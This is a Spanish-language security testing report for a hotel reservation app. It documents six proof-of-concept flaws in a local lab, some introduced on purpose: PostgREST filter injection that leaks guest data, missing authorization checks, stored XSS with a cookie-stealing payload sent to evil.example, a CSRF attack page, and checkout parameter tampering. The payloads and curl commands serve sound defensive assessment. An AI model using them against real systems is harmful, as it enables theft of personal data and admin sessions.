# Fase 2 — PoCs · Módulo Operaciones / Transacciones

| Campo | Valor |
|---|---|
| Módulo | Operaciones / Transacciones (`operations`) |
| Responsable | Aarón Líos Cubillo |
| Rama | `security/operations/fase2-pocs` |
| Insumo | `docs/proyecto-seguridad/operations/fase-1-diagnostico.md` (§3 observaciones, §5.5 riesgos) |
| Estado | A2.1 (V1) + A2.2 (V2) + A2.3 (V3) completos — OP-POC-1 … OP-POC-6 |

---

## OP-POC-1 — Inyección en filtro PostgREST → IDOR sobre reservas de otros huéspedes

| Campo | Valor |
|---|---|
| ID | OP-POC-1 |
| Vector | 1 — servidor |
| OWASP | A03:2021 Injection (clase PostgREST/Supabase query-builder) + A01:2021 Broken Access Control (IDOR) |
| NIST CSF 2.0 | PR.DS-10 (integridad de datos en uso), PR.AA-05 (menor privilegio), ID.RA-01 |
| Origen del hallazgo | **Introducida** (decisión de equipo §4.1 del plan de desarrollo) — el módulo no tenía ningún sink de inyección real alcanzable (hallazgo O11 de la Fase 1: todo el acceso a datos real usa el query builder parametrizado de Supabase). Se introdujo una nueva superficie pública ("consultar mi reserva") que sí es realista para el dominio (todo hotel ofrece esta función) para poder demostrar el vector 1 del enunciado. |
| Commit de introducción | `chore(security): introduce controlled vuln for OP-POC-1` en `security/operations/fase2-pocs` |
| Componente / archivo:línea | `apps/portal-reservas/src/features/reservation-lookup/services/lookupReservation.server.ts:50-61` (construcción del filtro), expuesto en `apps/portal-reservas/src/app/api/reservations/lookup/route.ts` (`POST /api/reservations/lookup`, público, sin sesión) |

### Descripción

`reservations` tiene RLS habilitado **sin políticas** (deny-all), así que cualquier función pública que
necesite leerla —incluida esta— usa el cliente **service-role** (mismo patrón que `galleryActions.ts` y
`reservationService.ts` en este módulo). La función arma el filtro de búsqueda concatenando directamente
los parámetros del usuario (`code`, `email`) dentro de un string pasado a `.or()` de PostgREST, en vez de
usar `.eq()` parametrizado:

```ts
// VULNERABLE — lookupReservation.server.ts:53
const filter = `${c.code}.ilike.%${input.code}%,${c.guest_email}.ilike.%${input.email}%`;

const { data, error } = await supabase
  .from(DB_TABLES.RESERVATIONS)
  .select(/* code, guest_name, guest_email, guest_phone, status, check_in, check_out, total_amount, currency */)
  .or(filter)   // <- input.code / input.email inyectados sin escapar
  .limit(50);
```

`.or()` de PostgREST interpreta internamente las comas como separador de condiciones **OR**. Como el
valor del usuario se concatena crudo, un atacante no solo controla el *valor* de un filtro: controla la
**sintaxis** del filtro completo. Esto es la clase de inyección específica de los query builders de
Supabase/PostgREST (análoga a la inyección SQL, pero a nivel del DSL de filtros de PostgREST), y coincide
con el mismo patrón de bug ya presente —de forma real, no introducida— en
`apps/panel-admin/src/features/audit-log/services/getAuditLogs.ts:57` (módulo de Fabian, ver nota de
coordinación al final).

### Precondiciones

- Ninguna. El endpoint `POST /api/reservations/lookup` es público, no requiere sesión.
- Requiere que exista al menos una fila en `reservations` (hoy la tabla se llena manualmente / vía seed,
  ver O10 de la Fase 1; no depende de datos de ningún huésped en particular).

### Pasos reproducibles

```bash
# 1. Caso legítimo: no hay coincidencia → lista vacía.
curl -s -X POST http://localhost:3001/api/reservations/lookup \
  -H "Content-Type: application/json" \
  -d '{"code":"RES-DESCONOCIDO","email":"nadie@ejemplo.com"}'
# → {"results":[]}

# 2. Ataque: el campo `email` cierra la condición `guest_email.ilike.%…%` con una coma
#    (separador OR de PostgREST) y agrega `status.ilike.%%`, una condición que
#    siempre es verdadera (cualquier status coincide con el comodín `%`...`%`).
curl -s -X POST http://localhost:3001/api/reservations/lookup \
  -H "Content-Type: application/json" \
  -d '{"code":"ZZZZ","email":"a,status.ilike.%"}'
# → {"results":[ ...TODAS las reservas de la tabla, con PII de huéspedes... ]}
```

El filtro final enviado a PostgREST queda:

```
code.ilike.%ZZZZ%,guest_email.ilike.%a,status.ilike.%%
```

que PostgREST parte en tres condiciones OR: `code.ilike.%ZZZZ%` (falso), `guest_email.ilike.%a` (falso
para casi todos), `status.ilike.%%` (**siempre verdadero** — el comodín coincide con cualquier string, y
`status` nunca es nulo por el `NOT NULL DEFAULT 'pending'` de la tabla). Al ser condiciones OR, basta con
que una sea verdadera para que la fila se devuelva: la consulta retorna **todas** las reservas.

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Consulta legítima (`code` + `email` reales) | Solo la reserva de ese huésped | ✅ Igual |
| Consulta con `email` = `a,status.ilike.%` | Lista vacía o error de validación | ❌ Devuelve **todas** las reservas: `guest_name`, `guest_email`, `guest_phone`, `status`, fechas y `total_amount` de cada huésped, sin conocer su código ni su correo real |

### Impacto

- **Confidencialidad:** fuga masiva de PII de huéspedes (Ley 8968, CR) desde un endpoint público y anónimo.
- **Integridad del control de acceso:** rompe la premisa de "solo el dueño de la reserva la puede consultar"
  → **IDOR** (A01) sin necesitar adivinar ningún identificador real.
- Corresponde al riesgo **OP-R08** de la Fase 1 (expuesto aquí con una ruta de explotación trivial, no
  solo teórica) y confirma el patrón de riesgo de O11 (ausencia de sinks reales) resuelto introduciendo
  la superficie mínima necesaria.

### Evidencia

- Test de regresión automatizado (no requiere red ni datos reales):
  `apps/portal-reservas/src/features/reservation-lookup/services/lookupReservation.server.test.ts`
  — verifica el string exacto que llega a `.or()` y que el payload de ataque produce la condición
  `status.ilike.%%` (siempre verdadera). Ejecutar: `pnpm --filter @hotel/portal-reservas vitest run
  src/features/reservation-lookup`.
- Reproducción manual por HTTP: comandos `curl` de arriba contra `pnpm --filter @hotel/portal-reservas dev`
  (puerto 3001) con al menos una fila en `reservations`.
- Nota de entorno: no fue posible grabar la salida de los `curl` contra el proyecto de Supabase de
  desarrollo del equipo desde este entorno de trabajo (resolución DNS intermitente hacia
  `*.supabase.co` en el sandbox de ejecución). El test de Vitest cubre la construcción del filtro de
  forma determinista sin depender de la red; la grabación en video (A3.7) se hará en un entorno con
  conectividad completa al proyecto de Supabase.

### Commit donde se reprodujo

Por confirmar al abrir el PR de A2.1 (se registra el hash exacto en la bitácora del plan de desarrollo).

---

## OP-POC-2 — `galleryActions` sin verificación de permisos (acceso sin autorización)

| Campo | Valor |
|---|---|
| ID | OP-POC-2 |
| Vector | 1 — servidor |
| OWASP | A01:2021 Broken Access Control |
| NIST CSF 2.0 | PR.AA-05 (permisos con menor privilegio), DE.CM-03 (sin cobertura de auditoría, agrava el hallazgo) |
| Origen del hallazgo | **Real** (confirma O1 y O2 de la Fase 1, sin modificar código) |
| Componente / archivo:línea | `apps/panel-admin/src/features/rooms/services/galleryActions.ts:11,71,93` (`uploadImage`, `deleteImage`, `reorderImages`); `apps/panel-admin/src/middleware.ts:13-51` |

### Descripción

Las tres funciones de escritura de `galleryActions.ts` son Server Actions (`"use server"`) que usan el
cliente **service-role** (`createSupabaseServiceClient`, que ignora RLS) y **no llaman a
`requirePermission`** en ningún punto — a diferencia de `reservationService.ts`, `bookingModeService.ts` y
`getRooms.ts`, que sí lo hacen (`requirePermission(PERMISSIONS.RESERVATIONS.*)`,
`requirePermission(PERMISSIONS.ROOMS.MANAGE)`). Comparar:

```ts
// reservationService.ts:37 — patrón correcto, usado en el resto del módulo
export async function updateReservationStatus(...) {
  await requirePermission(PERMISSIONS.RESERVATIONS.EDIT);
  ...
}

// galleryActions.ts:11 — sin guard de autorización
export async function uploadImage(roomId: string, file: File) {
  const supabase = createSupabaseServiceClient();
  ... // sube el archivo y escribe en room_images directamente
}
```

Además, el middleware de `panel-admin` (`middleware.ts:26-49`) solo exige `user` autenticado y
`profiles.is_active = true`; **no verifica el rol**. Cualquier cuenta activa del mismo proyecto de
Supabase Auth —incluida una cuenta `client` registrada desde el portal público, si comparte el mismo
Auth, o cualquier admin con permisos acotados que no incluyan `rooms_manage`— puede invocar estas
Server Actions, porque Next.js no aplica ningún control adicional sobre ellas más allá de "hay sesión".

### Precondiciones

- Una sesión autenticada y activa (`profiles.is_active = true`) en `panel-admin`, **de cualquier rol**
  (no se requiere `rooms_manage` ni ningún otro permiso).
- Conocer el id de una `room` existente (público: el catálogo de habitaciones es de lectura pública).

### Pasos reproducibles

1. Iniciar sesión en `apps/panel-admin` con una cuenta sin el permiso `rooms_manage` (o con un rol
   `admin` al que el owner no le haya asignado ese permiso).
2. Abrir las herramientas de desarrollo del navegador en cualquier página de `/admin/**` (la sesión ya
   pasó el middleware).
3. En la pestaña de red, localizar el identificador de acción (`Next-Action`) que el bundle del cliente
   asigna a `uploadImage`/`deleteImage`/`reorderImages` de `galleryActions.ts` (visible en el JS servido
   aunque el botón correspondiente esté oculto por falta de permiso en la UI).
4. Repetir la petición `POST` a la página de habitaciones con la cabecera `Next-Action: <id>` y el
   payload de la acción (p. ej. `deleteImage(imageId)` de una habitación arbitraria) usando la cookie de
   sesión del paso 1.
5. La imagen se borra (o se sube/reordena) sin que el servidor rechace la operación.

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Cuenta sin `rooms_manage` invoca `uploadImage`/`deleteImage`/`reorderImages` | `PermissionDeniedError` (como en `reservationService`/`getRooms`) | ❌ La operación se ejecuta sin ningún chequeo de autorización en el servidor |

### Impacto

- Cualquier cuenta activa del panel (incluso con permisos mínimos) puede alterar o borrar el contenido
  público del catálogo de habitaciones → **defacement** y, combinado con O3 (sin validación real de tipo
  de archivo en el servidor), vector adicional hacia XSS stored servido desde el dominio del hotel.
- Corresponde al riesgo **OP-R01** de la Fase 1 (Alto, 9 → sube a Crítico si además se confirma O2, que
  una cuenta `client` del portal alcanza el panel).

### Evidencia

- Lectura de código (arriba): ausencia de `requirePermission` confirmada por comparación directa con los
  tres servicios hermanos del mismo módulo que sí lo implementan correctamente.
- Reproducción en vivo (entorno local, 2026-10-20): con la cuenta `sec.admin.norooms@hotel.local` (rol
  `admin`, permisos `view:dashboard` + `reservations:view`, **sin** `rooms:manage`) se hizo el replay del
  Server Action `deleteImage` (`Next-Action: 4092c2ef…f3be`, body `["<imageId>"]`) → HTTP 200 y retorno
  `true`, y la fila de `room_images` quedó **borrada** (verificado en BD). El middleware de `panel-admin`
  solo exige sesión + `is_active` (no chequea rol), por lo que `/admin/rooms` y `/admin/rooms/gallery`
  devuelven 200 a esa cuenta. Evidencias en `operations/evidencias/`:
  `A2.1-A01-gallery-no-requirepermission.txt` (código + middleware + replay live) y
  `A2.1-A01-gallery-norooms-sidebar.png`.

### Commit donde se reprodujo

No aplica (hallazgo real sobre `develop`, sin modificación de código para esta PoC).

---

## OP-POC-3 — XSS stored vía notas del huésped (portal → panel admin)

| Campo | Valor |
|---|---|
| ID | OP-POC-3 |
| Vector | 2 — cliente (XSS stored) |
| OWASP | A03:2021 Injection (clase Cross-Site Scripting, stored) |
| NIST CSF 2.0 | PR.DS-01 (protección de datos en reposo/integridad), PR.PS-06 (prácticas de desarrollo seguro), DE.CM-09 |
| Origen del hallazgo | **Introducida** (decisión de equipo §4.1). El módulo no tenía ningún sink de XSS real: el portal no usa `dangerouslySetInnerHTML` y el panel renderiza los datos del huésped con JSX (`{guest.name}`…), que React escapa por defecto; además la tabla `reservations` no tenía ningún campo de texto libre del huésped. Se introdujo un campo realista de dominio ("solicitudes especiales", presente en el formulario de checkout pero que antes se descartaba) y se persiste la reserva en el checkout (flujo que el demo no tenía), para poder demostrar el vector 2 del enunciado: entrada de un huésped anónimo que cruza la frontera de confianza hacia la sesión de un admin autenticado. |
| Commit de introducción | `chore(security): introduce controlled vuln for OP-POC-3` en `security/operations/fase2-pocs` |
| Componente / archivo:línea | **Sink:** `apps/panel-admin/src/features/reservations/components/detail/ReservationGuestCard/ReservationGuestCard.tsx` (`dangerouslySetInnerHTML={{ __html: guest.notes }}`). **Fuente/persistencia:** `apps/portal-reservas/src/features/checkout/services/createReservation.server.ts` (guarda `guest_notes` crudo) vía `gateway.server.ts`; campo capturado en `GuestForm.tsx` (`specialRequests`). **Esquema:** `packages/db/supabase/migrations/20261018000001_add_guest_notes_to_reservations.sql`. |

### Descripción

El flujo del checkout del portal ahora persiste la reserva (incluyendo las "solicitudes especiales" que
el huésped escribe en `GuestForm`) en `reservations.guest_notes`, usando el cliente **service-role** (mismo
patrón deny-all/RLS del módulo, ver OP-POC-1). El valor se guarda **verbatim**, lo cual es normal: guardar
la entrada cruda del usuario no es el bug.

El bug es la **salida**: el visor de reservas del panel admin renderiza esas notas **sin escapar**:

```tsx
// VULNERABLE — ReservationGuestCard.tsx
<span
  className={STYLES.fieldValue}
  dangerouslySetInnerHTML={{ __html: guest.notes }}  // <- HTML/JS del huésped, sin escapar
/>
```

Como `guest.notes` proviene de un huésped **anónimo** (el checkout es público, no requiere cuenta) y se
renderiza en la sesión de un **admin autenticado** que abre el detalle de la reserva, un payload como
`<img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">` se ejecuta con los privilegios del
admin. Es la clase de XSS stored del enunciado (vector 2) y es el mismo patrón —de forma real— que
`formatMetadataHtml` + `dangerouslySetInnerHTML` del drawer de auditoría de Fabian (AUD-POC-4), por lo que
el fix de salida (A3.2 / F3.2) debe alinearse.

### Precondiciones

- Para plantar el payload: ninguna. El checkout (`/reserve`) es público y anónimo.
- Para dispararlo: un admin con `reservations:view` abre el detalle de esa reserva en `panel-admin`
  (`/admin/reservations/**`) — acción rutinaria del negocio.

### Pasos reproducibles

1. Levantar portal y panel: `pnpm --filter @hotel/portal-reservas dev` (:3001) y
   `pnpm --filter @hotel/panel-admin dev` (:3002).
2. En el portal, iniciar una reserva (`/reserve?...`), completar el formulario de huésped y en
   **"Solicitudes especiales"** escribir el payload:
   `<img src=x onerror="document.title='XSS-OP-POC-3'">`.
3. Completar el checkout (con la pasarela en modo mock, sin `STRIPE_SECRET_KEY`, el flujo llega a éxito y
   la reserva queda persistida con las notas).
4. En el panel admin, abrir la lista de reservas y entrar al detalle de esa reserva.
5. Al renderizar `ReservationGuestCard`, el navegador del admin ejecuta el `onerror` del `<img>` roto
   (el título de la pestaña cambia a `XSS-OP-POC-3`; con el payload de robo de cookie, se exfiltra la
   sesión del admin).

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Nota del huésped con `<b>hola</b>` | Se muestra el texto literal `<b>hola</b>` | ❌ Se renderiza en **negrita** (el HTML se interpreta) |
| Nota con `<img src=x onerror=...>` | Texto inerte | ❌ Se **ejecuta** JS arbitrario en la sesión del admin |

### Impacto

- **Stored XSS persistente** disparado por un atacante anónimo contra usuarios privilegiados (admins) →
  robo de sesión, acciones en nombre del admin (cambiar estado de reservas, invitar admins vía el módulo
  de Joseph, etc.), pivot a toda la superficie del panel.
- Cruza la frontera de confianza huésped→operador identificada en la ruta de trabajo del módulo y en la
  Fase 1 (datos del huésped mostrados en el panel). Corresponde al riesgo de integridad/confidencialidad
  del operador; severidad **Alta/Crítica** por ser no autenticado en la entrada y privilegiado en la salida.

### Evidencia

- Lectura de código (arriba): el sink `dangerouslySetInnerHTML` y la cadena fuente→persistencia→render.
- Reproducción en vivo (Supabase local, 2026-10-20): `A2.2-xss-executed-panel.png` (banner inyectado por el
  `onerror` en la sesión del admin/owner), `A2.2-guest-notes-raw-row.txt` (fila con `guest_notes` crudo) y
  `A2.2-xss-stored-panel.txt`. El sink confirmado es la **salida** sin escapar.
- ⚠️ **Nota de entorno — persistencia del checkout inalcanzable:** el camino `checkout → persistReservation`
  **no persiste**: inserta `room_id = rooms[0].id` tomado de `mockRooms` (string `"mv-1"`), pero
  `reservations.room_id` es `uuid NOT NULL` con FK a `rooms` (ids uuid, datos disjuntos) → el insert falla con
  `22P02` (invalid input syntax for type uuid). Por eso la fila de la PoC se **insertó directamente en la BD**
  (el hallazgo de OP-POC-3 es el render sin escapar, no cómo llega el dato). Es un bug de datos aparte, no del
  sink. Follow-up: reconciliar el catálogo de habitaciones (ver `fase-3-parches.md`, sección A3.3).

### Commit donde se reprodujo

Commit de introducción `chore(security): introduce controlled vuln for OP-POC-3` (hash exacto en la
bitácora del plan de desarrollo al abrir el PR de Fase 2).

---

## OP-POC-4 — CSRF en `POST /api/checkout` (reserva forzada cross-site)

| Campo | Valor |
|---|---|
| ID | OP-POC-4 |
| Vector | 3 — alteración de entrada |
| OWASP | A08:2021 Software and Data Integrity Failures (CSRF / petición falsificada entre sitios) |
| NIST CSF 2.0 | PR.DS-01, PR.PS-06, DE.CM-09 |
| Origen del hallazgo | **Real** sobre `develop` (el endpoint existe desde US-DM-06). La persistencia de reservas que agregó OP-POC-3 amplifica el impacto: ahora cada petición forjada crea una fila en `reservations`. |
| Componente / archivo:línea | `apps/portal-reservas/src/app/api/checkout/route.ts` (handler `POST`, sin token anti-CSRF ni verificación de `Origin`/`Referer`); `apps/portal-reservas/src/middleware.ts:18-35` (solo refresca sesión; no valida origen). |

### Descripción

`POST /api/checkout` es un **Route Handler** de Next, no una Server Action. Las Server Actions de Next 15
traen verificación de `Origin` contra el host integrada; **los Route Handlers no**. Este handler no exige
ningún token anti-CSRF, no valida `Origin`/`Referer`, no usa `SameSite` como defensa (no hay cookie de
sesión involucrada porque el checkout es anónimo) y acepta `Content-Type: application/json` desde cualquier
origen. En consecuencia, cualquier página web controlada por un atacante puede disparar la creación de
reservas en el hotel en nombre del visitante.

```ts
// route.ts — sin ninguna defensa contra peticiones de otro origen
export async function POST(request: Request) {
  const payload = (await request.json().catch(() => ({}))) as CheckoutSessionPayload;
  const result = await openGatewaySession(payload); // -> persistReservation(...)
  return Response.json(result.body, { status: result.status });
}
```

Contraste (mismo repo, patrón correcto): `updateReservationStatusAction`
(`apps/panel-admin/src/features/reservations/actions/updateStatus.ts`) es `"use server"` y pasa por
`requirePermission(PERMISSIONS.RESERVATIONS.EDIT)` + la protección de origen de las Server Actions → el
cambio de estado de una reserva **no** es CSRF-able. La asimetría está en el handler público.

### Precondiciones

- Ninguna sobre la víctima más que visitar una página del atacante. El endpoint es público y anónimo.

### Pasos reproducibles

```html
<!-- Página del atacante (evil.example). Al cargarla, el navegador de la víctima
     dispara una reserva en el hotel sin su consentimiento. fetch no-cors basta:
     no se necesita leer la respuesta, solo provocar el efecto de lado. -->
<script>
  fetch("http://localhost:3001/api/checkout", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      roomIds: ["room-std-01"], checkIn: "2027-01-01", checkOut: "2027-01-05",
      guests: 2, email: "victima@ejemplo.com", fullName: "Forzado",
      phone: "0000", specialRequests: ""
    })
  });
</script>
```

Equivalente por consola/curl (sin cabecera `Origin`, simulando el cross-site):

```bash
curl -s -X POST http://localhost:3001/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"roomIds":["room-std-01"],"checkIn":"2027-01-01","checkOut":"2027-01-05","guests":2,"email":"victima@ejemplo.com","fullName":"Forzado","phone":"0000","specialRequests":""}'
# → 200 + URL de pago; y una nueva fila en `reservations`.
```

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Petición `POST` sin `Origin` del propio sitio / sin token | Rechazada (403) | ❌ Aceptada; crea la reserva |

### Impacto

- Creación de reservas forjadas desde cualquier sitio → contaminación de la tabla `reservations` que los
  admins gestionan, spam/DoS de inventario (bloqueo de habitaciones), y **vector de entrega de OP-POC-3**
  (plantar el payload de XSS stored desde un contexto totalmente externo, sin pasar por la UI del portal).
- Corresponde a la ausencia de control de integridad de origen (DE.CM-09 / PR.PS-06).

### Evidencia

- Lectura de código (arriba). Reproducción por HTTP en vivo (Supabase local, 2026-10-20):
  `A2.3-A08-csrf-forced-reservation.txt` — `POST /api/checkout` sin cabecera `Origin` del sitio → **HTTP 200**.
- ⚠️ **Nota:** el hallazgo confirmado es la **aceptación** de la petición cross-site (200). La "creación de la
  fila" **no se observa** por el mismo bug de persistencia de OP-POC-3 (`room_id` mock vs `uuid`/FK → `22P02`),
  que traga/rechaza el insert. No afecta al vector CSRF en sí.

### Commit donde se reprodujo

No aplica (hallazgo real sobre `develop`; la fila persistida usa el flujo de OP-POC-3).

---

## OP-POC-5 — Manipulación de parámetros del checkout (fechas / disponibilidad / aforo)

| Campo | Valor |
|---|---|
| ID | OP-POC-5 |
| Vector | 3 — alteración de entrada |
| OWASP | A08:2021 (integridad de datos) + A04:2021 Insecure Design (falta de validación de lógica de negocio) |
| NIST CSF 2.0 | PR.DS-01, PR.PS-06, ID.RA-01 |
| Origen del hallazgo | **Real.** El checkout toma `checkIn`, `checkOut`, `guests` y `roomIds` de la URL (`parseReservationParams`) y los usa sin validarlos contra reglas de negocio. |
| Componente / archivo:línea | `apps/portal-reservas/src/lib/reservationUrl.ts` (parseo), `apps/portal-reservas/src/features/checkout/services/gateway.server.ts` (solo valida que las habitaciones existan y que haya fechas), `.../services/createReservation.server.ts` (persiste los valores tal cual). |

### Descripción

**El precio NO es manipulable** (control que sí se cumple): las habitaciones y sus precios provienen del
catálogo del servidor (`findRoomsByIds` sobre `mockRooms`), y tanto los `line_items` de Stripe
(`buildStripeCheckoutParams`) como el total persistido (`persistReservation`) se **recalculan en el
servidor** a partir de ese catálogo. El cliente solo envía `roomIds`; cambiar un precio en el request no
tiene efecto. Esto es la contraparte correcta de OP-POC-1 y se documenta como línea base del vector.

**Lo que sí es manipulable** son los parámetros de reserva, que no tienen validación de negocio:

- **Fechas sin cordura:** `checkIn`/`checkOut` solo se validan por el `CHECK (check_out > check_in)` de la
  tabla. Se puede reservar en el **pasado** o por rangos arbitrarios.
- **Sin control de disponibilidad:** no hay verificación de solapamiento → se puede **sobre-reservar** la
  misma habitación para fechas que ya están ocupadas (doble booking).
- **Aforo arbitrario:** `guests` llega como entero y se persiste en `adults` sin contrastarlo con la
  capacidad de la habitación.

### Precondiciones

- Ninguna (checkout público). Combinable con OP-POC-4 para hacerlo cross-site.

### Pasos reproducibles

```bash
# Reserva en el pasado y con aforo imposible para una habitación estándar.
curl -s -X POST http://localhost:3001/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"roomIds":["room-std-01"],"checkIn":"2020-01-01","checkOut":"2020-01-02","guests":99,"email":"a@b.co","fullName":"Fechas Pasadas","phone":"0","specialRequests":""}'
# → 200 + reserva creada con check_in en 2020 y adults=99.

# Doble booking: repetir dos veces el mismo room+fechas → ambas quedan "pending".
```

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| `checkIn` en el pasado | Rechazo (fecha inválida) | ❌ Reserva creada |
| Segunda reserva solapada del mismo cuarto | Rechazo (no disponible) | ❌ Ambas aceptadas |
| `guests` > capacidad de la habitación | Rechazo | ❌ `adults` = 99 persistido |

### Impacto

- Corrupción de la integridad del inventario de reservas (fechas inválidas, overbooking, aforo imposible)
  que los operadores del panel deben gestionar manualmente. Riesgo de negocio directo.
- El precio queda íntegro (control presente), por lo que el riesgo residual del sub-vector "precio" es
  **Bajo**; el de "fechas/disponibilidad/aforo" es **Medio**.

### Evidencia

- Lectura de código + comandos `curl`. Reproducción en vivo (Supabase local, 2026-10-20):
  `A2.3-A08-param-tampering.txt` — fecha 2020 + aforo 99 (cuarto cap. 2) + doble booking → los tres **HTTP 200**.
- La validación que falta se agrega en A3.3 (esquema Zod server-side: fechas futuras, aforo ≤ capacidad) junto
  con la defensa anti-CSRF de OP-POC-4.
- ⚠️ **Nota:** el sub-vector *fechas/aforo* se valida de verdad (Zod + capacidad, sobre `mockRooms` en memoria).
  El sub-vector *disponibilidad/overbooking* y la "fila creada" **no se ejercitan** por el bug de persistencia
  (`room_id` mock `"mv-1"` vs columna `uuid`/FK → `22P02`): la consulta de disponibilidad de A3.3 y el insert
  fallan antes de tocar la lógica de solapamiento. Detalle e impacto en el riesgo residual: `fase-3-parches.md`.
  **Resuelto en Fase 3** (commit `ce54581`, catálogo de rooms reconciliado): el checkout persiste y la
  disponibilidad/`EXCLUDE` se verifican en vivo (`evidencias/A3.3-rooms-catalog-live.txt`).

### Commit donde se reprodujo

No aplica (hallazgo real sobre `develop`).

---

## OP-POC-6 — Log injection en eventos de operaciones (hallazgo documentado, sin repro en este módulo)

| Campo | Valor |
|---|---|
| ID | OP-POC-6 |
| Vector | 3 — alteración de entrada (log injection) |
| OWASP | A09:2021 Security Logging and Monitoring Failures |
| NIST CSF 2.0 | DE.CM-01/03/09 (brecha de cobertura), PR.PS-04 |
| Origen del hallazgo | **Real (negativo).** El módulo de operaciones **no registra ningún evento de auditoría** hoy: no hay una sola llamada a `logAuditEvent` en `checkout/**`, `reservations/**` ni `reservation-lookup/**` (confirmado por búsqueda). |

### Descripción

Al no existir ningún sink de logging en operaciones, **no hay una PoC de log injection reproducible dentro
de este módulo** (no se puede envenenar un log que no se escribe). Es una **brecha DETECT** ya señalada en
la Fase 1: creación y cambios de estado de reservas ocurren sin traza de auditoría.

La clase de ataque sí está demostrada de forma **real y cross-module** por Fabian en **AUD-POC-6**
(inyección de `\r\n` + texto fabricado vía un campo libre que llega a `audit_logs`). El riesgo concreto para
operaciones aparece **cuando se cierre A3.4** (registrar creación/cambio de reservas vía la API de Fabian):
campos libres controlados por el huésped —`guest_notes`, `guest_name`— con saltos de línea o caracteres de
control contaminarían los eventos de operaciones igual que AU-R04.

### Remediación asociada (Fase 3)

- **A3.4** debe (a) instrumentar los eventos de operaciones vía `logAuditEvent` y (b) **sanitizar** los
  campos libres antes de registrarlos (normalizar saltos de línea / caracteres de control), reutilizando la
  utilidad de saneo que Fabian expone en F3.3/F3.4 para no reintroducir AU-R04 en este módulo.

### Evidencia

- Búsqueda negativa: sin coincidencias de `logAuditEvent`/`AUDIT_ACTIONS` en el código de operaciones.

### Commit donde se reprodujo

No aplica (hallazgo negativo / de cobertura).

---

## Coordinación con otros módulos

- **OP-POC-1** reutiliza la misma clase de bug (`.or()` con concatenación de strings) ya presente de
  forma real en `getAuditLogs.ts:57` del módulo de Fabian — avisarle para que lo documente como hallazgo
  propio (F2.1) y para alinear el fix de Fase 3 (A3.1 / F3.1) en ambos módulos a la vez.
- **OP-POC-2** depende de que el middleware del panel (dueño: Paula) no verifica rol — su fix (P3.1 o
  CSP/middleware global) también cierra parte de este hallazgo; A3.1 debe añadir `requirePermission`
  en `galleryActions` como defensa en profundidad independiente del middleware.
- **OP-POC-3** comparte sink y clase de bug con **AUD-POC-4** (Fabian): `dangerouslySetInnerHTML` sobre
  datos controlables por un usuario no privilegiado. Alinear los fixes de salida de Fase 3 (A3.2 / F3.2):
  escape por defecto de React (`{valor}` en vez de `__html`) y, para Paula, una **CSP** global que corte
  la ejecución inline como defensa en profundidad para ambos módulos.
- **OP-POC-4 (CSRF)** toca cabeceras/criterios de origen que son terreno de Paula (`middleware.ts` / CSP y
  cookies del sistema, §4.4). Coordinar: el fix de A3.3 (token anti-CSRF o verificación de `Origin` en el
  route handler) debe encajar con cualquier defensa global de origen que Paula introduzca (P3.x).
- **OP-POC-6 (log injection)** depende de la API de auditoría de Fabian: A3.4 instrumenta los eventos de
  operaciones y reutiliza la utilidad de saneo de F3.3/F3.4; sin esa utilidad publicada no se puede cerrar
  A3.4 sin reintroducir AU-R04.
